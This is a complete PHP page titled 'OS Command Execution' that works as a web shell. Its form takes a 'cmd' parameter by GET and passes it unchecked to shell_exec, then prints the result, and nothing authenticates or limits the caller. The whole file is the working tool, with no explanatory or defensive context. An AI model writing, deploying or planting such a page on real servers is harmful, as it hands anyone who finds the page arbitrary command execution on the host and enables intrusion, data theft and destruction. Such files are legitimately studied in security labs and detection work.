<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
    <title>OS Command Execution</title>
</head>
<body>
    <form method="GET">
        <textarea name="cmd" cols="100" rows="5"></textarea>
        <br/>
        <input type="submit" />
    </form>
    <pre>
    <?php

        $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';

        if (!empty($cmd)) {
            try {
                $output = shell_exec($cmd);

                if ($output) {
                    echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
                } else {
                    echo "No output or invalid command.";
                }
            } catch (Exception $e) {
                echo "Error: " . htmlspecialchars($e->getMessage(), ENT_QUOTES, 'UTF-8');
            }
        }
    ?>
    </pre>
</body>
</html>
